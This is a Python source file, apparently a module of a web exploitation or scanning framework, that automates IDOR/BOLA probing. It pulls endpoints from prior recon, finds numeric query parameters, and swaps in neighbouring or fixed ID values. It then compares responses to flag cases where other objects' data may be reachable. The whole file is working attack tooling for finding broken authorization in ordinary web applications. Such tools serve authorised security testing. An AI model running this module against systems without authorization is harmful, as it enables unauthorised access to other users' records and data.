from __future__ import annotations

import re
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from core.module import ExploitModule
from core.models import ExploitResult
from core.payloads import get_payloads


class IDORModule(ExploitModule):
    name = "IDOR / BOLA"
    category = "access"

    async def run(self, ctx):
        endpoints = ctx.artifacts.get("recon.endpoints", [])
        evidence = []
        payloads = get_payloads(self.name)
        for endpoint in endpoints[:50]:
            parts = urlsplit(endpoint)
            params = parse_qsl(parts.query, keep_blank_values=True)
            candidates = [(i, n, v) for i, (n, v) in enumerate(params) if re.fullmatch(r"\d+", v or "")]
            for idx, name, value in candidates[:5]:
                current = int(value)
                variations = []
                for payload in payloads:
                    if payload == "<id>+1": variations.append((payload, current + 1))
                    elif payload == "<id>-1": variations.append((payload, max(0, current - 1)))
                    elif payload == "<id>+2": variations.append((payload, current + 2))
                    elif payload == "<id>-2": variations.append((payload, max(0, current - 2)))
                    elif payload.isdigit(): variations.append((payload, int(payload)))
                for pidx, (payload, new_value) in enumerate(variations, start=1):
                    ctx.logger(f"[payload {pidx}/{len(variations)}] IDOR / BOLA: {payload}")
                    mutated = params.copy()
                    mutated[idx] = (name, str(new_value))
                    probe = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(mutated), parts.fragment))
                    try:
                        r1 = await ctx.http.request("GET", endpoint)
                        r2 = await ctx.http.request("GET", probe)
                        ctx.inspect_source(str(r2.url), r2.text, payload, pidx, r2.headers.get("content-type", ""))
                        similarity = abs(len(r1.text) - len(r2.text))
                        if r2.status_code == 200 and similarity > 20:
                            msg = f"Potential object access change: {name}={value} -> {new_value} ({len(r1.text)} vs {len(r2.text)} bytes)"
                            evidence.append(msg)
                            ctx.add_finding(probe, payload, self.name, f"HTTP {r2.status_code}; response size changed by {similarity} bytes", confidence="medium")
                    except Exception as exc:
                        evidence.append(str(exc))
        return ExploitResult(self.name, "signal" if evidence else "no-signal", "ID variation probes completed", evidence="\n".join(evidence[:20]))
